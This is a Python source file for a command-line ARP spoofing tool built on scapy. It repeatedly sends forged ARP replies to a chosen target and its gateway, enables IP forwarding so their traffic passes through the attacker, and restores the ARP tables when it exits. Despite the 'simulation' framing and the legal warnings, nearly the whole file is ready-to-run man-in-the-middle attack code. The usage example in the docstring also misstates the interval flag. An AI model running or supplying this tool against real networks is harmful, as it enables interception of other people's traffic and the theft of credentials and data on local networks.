#!/usr/bin/env python3
"""
ARP Spoofing Attack Simulation

This module provides a class-based implementation for simulating ARP spoofing attacks
(also known as ARP poisoning) against target systems on a local network. It allows for
man-in-the-middle attacks by intercepting traffic between victims.

The module supports various features:
- Spoofing ARP tables of target systems
- Enabling IP forwarding for traffic interception
- Customizable packet sending intervals
- Detailed logging and statistics
- Graceful shutdown with ARP table restoration

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic usage with command line arguments
    python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1
    
    # Specify custom interval between packets
    python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -i 2
    
    # Enable verbose mode for detailed output
    python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -v

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import signal
import argparse
import ipaddress
from typing import List, Dict, Optional, Any, Tuple, Union

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)

# Import scapy with error handling
try:
    from scapy.all import ARP, Ether, srp, send, conf, get_if_hwaddr, get_if_list
except ImportError:
    logger.error("This script requires the scapy library.")
    logger.error("Install it using: pip install scapy")
    sys.exit(1)

# Suppress scapy warnings
conf.verb = 0


class ARPSpoofingAttack:
    """
    A class to perform ARP spoofing attack simulations for security testing.
    
    This class provides methods to poison ARP tables of target systems,
    enabling man-in-the-middle attacks by intercepting traffic between victims.
    
    Attributes:
        target_ip (str): IP address of the target system
        gateway_ip (str): IP address of the gateway/router
        interface (str): Network interface to use
        interval (float): Time interval between ARP packets in seconds
        verbose (bool): Whether to enable verbose output
    """
    
    def __init__(self, 
                 target_ip: str, 
                 gateway_ip: str,
                 interface: Optional[str] = None,
                 interval: float = 1.0,
                 verbose: bool = False):
        """
        Initialize the ARP spoofing attack simulator.
        
        Args:
            target_ip (str): IP address of the target system
            gateway_ip (str): IP address of the gateway/router
            interface (str, optional): Network interface to use. If None, will be auto-detected.
            interval (float, optional): Time interval between ARP packets in seconds. Defaults to 1.0.
            verbose (bool, optional): Whether to enable verbose output. Defaults to False.
            
        Raises:
            ValueError: If target_ip or gateway_ip is not a valid IP address
            ValueError: If interface is not found
        """
        # Validate IP addresses
        try:
            ipaddress.ip_address(target_ip)
            self.target_ip = target_ip
        except ValueError:
            raise ValueError(f"Invalid target IP address: {target_ip}")
            
        try:
            ipaddress.ip_address(gateway_ip)
            self.gateway_ip = gateway_ip
        except ValueError:
            raise ValueError(f"Invalid gateway IP address: {gateway_ip}")
        
        # Set interface
        if interface is None:
            self.interface = self._get_default_interface()
        else:
            if interface not in get_if_list():
                raise ValueError(f"Interface {interface} not found")
            self.interface = interface
        
        # Get MAC address of the interface
        self.attacker_mac = get_if_hwaddr(self.interface)
        
        # Set other parameters
        self.interval = max(0.1, interval)  # Ensure reasonable interval
        self.verbose = verbose
        
        # Initialize state variables
        self.running = False
        self.packets_sent = 0
        self.start_time = None
        self.end_time = None
        
        # Target and gateway MAC addresses (to be discovered)
        self.target_mac = None
        self.gateway_mac = None
        
        # Set scapy verbosity
        conf.verb = 1 if verbose else 0
        
        logger.info(f"Initialized ARP spoofing attack simulation")
        logger.info(f"Target: {target_ip}, Gateway: {gateway_ip}, Interface: {self.interface}")
        if self.verbose:
            logger.info(f"Attacker MAC: {self.attacker_mac}, Interval: {interval}s")
    
    def _get_default_interface(self) -> str:
        """
        Get the default network interface.
        
        Returns:
            str: Name of the default interface
            
        Raises:
            RuntimeError: If no suitable interface is found
        """
        interfaces = get_if_list()
        if not interfaces:
            raise RuntimeError("No network interfaces found")
        
        # Filter out loopback interfaces
        valid_interfaces = [iface for iface in interfaces if not iface.startswith('lo')]
        if not valid_interfaces:
            raise RuntimeError("No non-loopback interfaces found")
        
        # Return the first non-loopback interface
        return valid_interfaces[0]
    
    def _get_mac(self, ip: str) -> Optional[str]:
        """
        Get the MAC address of an IP on the network.
        
        Args:
            ip (str): IP address to find MAC for
            
        Returns:
            Optional[str]: MAC address if found, None otherwise
        """
        try:
            # Create ARP request packet
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_request
            
            # Send packet and get response
            result = srp(packet, timeout=3, verbose=0, iface=self.interface)[0]
            
            # Return MAC from response
            return result[0][1].hwsrc if result else None
            
        except Exception as e:
            logger.error(f"Error getting MAC for {ip}: {str(e)}")
            return None
    
    def _enable_ip_forwarding(self) -> bool:
        """
        Enable IP forwarding on the system to allow traffic to pass through.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Check OS type
            if sys.platform.startswith('linux'):
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            elif sys.platform == "darwin":  # macOS
                os.system("sysctl -w net.inet.ip.forwarding=1")
            else:
                logger.warning(f"IP forwarding not supported on {sys.platform}")
                return False
                
            logger.info("IP forwarding enabled")
            return True
            
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {str(e)}")
            return False
    
    def _disable_ip_forwarding(self) -> bool:
        """
        Disable IP forwarding on the system.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Check OS type
            if sys.platform.startswith('linux'):
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            elif sys.platform == "darwin":  # macOS
                os.system("sysctl -w net.inet.ip.forwarding=0")
            else:
                logger.warning(f"IP forwarding not supported on {sys.platform}")
                return False
                
            logger.info("IP forwarding disabled")
            return True
            
        except Exception as e:
            logger.error(f"Failed to disable IP forwarding: {str(e)}")
            return False
    
    def _spoof(self, target_ip: str, target_mac: str, spoof_ip: str) -> bool:
        """
        Send spoofed ARP packet to target.
        
        Args:
            target_ip (str): IP address of the target
            target_mac (str): MAC address of the target
            spoof_ip (str): IP address to spoof (pretend to be)
            
        Returns:
            bool: True if packet sent successfully, False otherwise
        """
        try:
            # Create ARP packet
            packet = ARP(
                op=2,  # ARP reply
                pdst=target_ip,  # Target IP
                hwdst=target_mac,  # Target MAC
                psrc=spoof_ip,  # Spoofed source IP (gateway)
                hwsrc=self.attacker_mac  # Attacker MAC
            )
            
            # Send packet
            send(packet, verbose=0, iface=self.interface)
            self.packets_sent += 1
            
            if self.verbose:
                logger.debug(f"Sent ARP packet: {target_ip} is at {self.attacker_mac}")
                
            return True
            
        except Exception as e:
            logger.error(f"Error sending spoofed ARP packet: {str(e)}")
            return False
    
    def _restore(self, target_ip: str, target_mac: str, source_ip: str, source_mac: str) -> bool:
        """
        Restore ARP tables to normal.
        
        Args:
            target_ip (str): IP address of the target
            target_mac (str): MAC address of the target
            source_ip (str): Original IP address
            source_mac (str): Original MAC address
            
        Returns:
            bool: True if restoration successful, False otherwise
        """
        try:
            # Create restoration packet
            packet = ARP(
                op=2,  # ARP reply
                pdst=target_ip,  # Target IP
                hwdst=target_mac,  # Target MAC
                psrc=source_ip,  # Original source IP
                hwsrc=source_mac  # Original source MAC
            )
            
            # Send packet multiple times to ensure it takes effect
            send(packet, verbose=0, iface=self.interface, count=5)
            
            if self.verbose:
                logger.debug(f"Restored ARP tables: {source_ip} is at {source_mac}")
                
            return True
            
        except Exception as e:
            logger.error(f"Error restoring ARP tables: {str(e)}")
            return False
    
    def setup(self) -> bool:
        """
        Set up the attack by resolving MAC addresses and enabling IP forwarding.
        
        Returns:
            bool: True if setup successful, False otherwise
        """
        logger.info("Setting up ARP spoofing attack...")
        
        # Get target MAC address
        logger.info(f"Resolving MAC address for target {self.target_ip}...")
        self.target_mac = self._get_mac(self.target_ip)
        if not self.target_mac:
            logger.error(f"Could not resolve MAC address for {self.target_ip}")
            return False
        logger.info(f"Target MAC: {self.target_mac}")
        
        # Get gateway MAC address
        logger.info(f"Resolving MAC address for gateway {self.gateway_ip}...")
        self.gateway_mac = self._get_mac(self.gateway_ip)
        if not self.gateway_mac:
            logger.error(f"Could not resolve MAC address for {self.gateway_ip}")
            return False
        logger.info(f"Gateway MAC: {self.gateway_mac}")
        
        # Enable IP forwarding
        if not self._enable_ip_forwarding():
            logger.warning("Failed to enable IP forwarding. Attack may not work correctly.")
        
        return True
    
    def execute(self) -> Dict[str, Any]:
        """
        Execute the ARP spoofing attack.
        
        Returns:
            Dict[str, Any]: Statistics about the attack execution
        """
        # Set up the attack
        if not self.setup():
            logger.error("Attack setup failed")
            return {"success": False, "error": "Attack setup failed"}
        
        logger.info(f"Starting ARP spoofing attack against {self.target_ip}")
        self.running = True
        self.start_time = time.time()
        self.packets_sent = 0
        
        try:
            # Register signal handlers for graceful shutdown
            signal.signal(signal.SIGINT, self._signal_handler)
            signal.signal(signal.SIGTERM, self._signal_handler)
            
            # Main attack loop
            while self.running:
                # Spoof target -> make target think we are the gateway
                self._spoof(self.target_ip, self.target_mac, self.gateway_ip)
                
                # Spoof gateway -> make gateway think we are the target
                self._spoof(self.gateway_ip, self.gateway_mac, self.target_ip)
                
                # Wait before sending next packets
                time.sleep(self.interval)
                
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Error during attack: {str(e)}")
        finally:
            # Clean up
            self.cleanup()
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats
    
    def cleanup(self) -> None:
        """
        Clean up after the attack by restoring ARP tables and disabling IP forwarding.
        """
        logger.info("Cleaning up and restoring ARP tables...")
        self.running = False
        
        # Restore target's ARP table
        if self.target_mac and self.gateway_mac:
            logger.info(f"Restoring ARP table for {self.target_ip}...")
            self._restore(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
            
            # Restore gateway's ARP table
            logger.info(f"Restoring ARP table for {self.gateway_ip}...")
            self._restore(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
        
        # Disable IP forwarding
        self._disable_ip_forwarding()
        
        logger.info("Cleanup completed")
    
    def _signal_handler(self, sig, frame) -> None:
        """
        Handle signals for graceful shutdown.
        
        Args:
            sig: Signal number
            frame: Current stack frame
        """
        logger.info(f"Received signal {sig}, shutting down...")
        self.running = False
    
    def _get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the attack execution.
        
        Returns:
            Dict[str, Any]: Statistics including packets sent, duration, etc.
        """
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time
        
        return {
            "target_ip": self.target_ip,
            "target_mac": self.target_mac,
            "gateway_ip": self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "interface": self.interface,
            "packets_sent": self.packets_sent,
            "duration_seconds": duration,
            "packets_per_second": self.packets_sent / duration if duration > 0 else 0,
            "success": True
        }
    
    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """
        Print a summary of the attack execution.
        
        Args:
            stats (Dict[str, Any]): Statistics from _get_statistics()
        """
        logger.info("=" * 50)
        logger.info("ARP Spoofing Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Target: {stats['target_ip']} ({stats['target_mac']})")
        logger.info(f"Gateway: {stats['gateway_ip']} ({stats['gateway_mac']})")
        logger.info(f"Interface: {stats['interface']}")
        logger.info(f"Packets sent: {stats['packets_sent']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Rate: {stats['packets_per_second']:.2f} packets/second")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for the ARP spoofing attack.
    
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Attack Simulation Tool",
        epilog="IMPORTANT: Use only for authorized security testing."
    )
    
    # Required arguments
    parser.add_argument(
        "-t", "--target",
        dest="target_ip",
        required=True,
        help="IP address of the target system"
    )
    
    parser.add_argument(
        "-g", "--gateway",
        dest="gateway_ip",
        required=True,
        help="IP address of the gateway/router"
    )
    
    # Optional arguments
    parser.add_argument(
        "-i", "--interface",
        dest="interface",
        help="Network interface to use (default: auto-detect)"
    )
    
    parser.add_argument(
        "-n", "--interval",
        dest="interval",
        type=float,
        default=1.0,
        help="Time interval between ARP packets in seconds (default: 1.0)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    return parser.parse_args()


def main() -> None:
    """
    Main entry point for the ARP spoofing attack simulation.
    """
    # Display ethical notice
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()
    
    try:
        # Parse command-line arguments
        args = parse_arguments()
        
        # Create and execute the attack
        attack = ARPSpoofingAttack(
            target_ip=args.target_ip,
            gateway_ip=args.gateway_ip,
            interface=args.interface,
            interval=args.interval,
            verbose=args.verbose
        )
        
        # Execute the attack
        attack.execute()
        
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
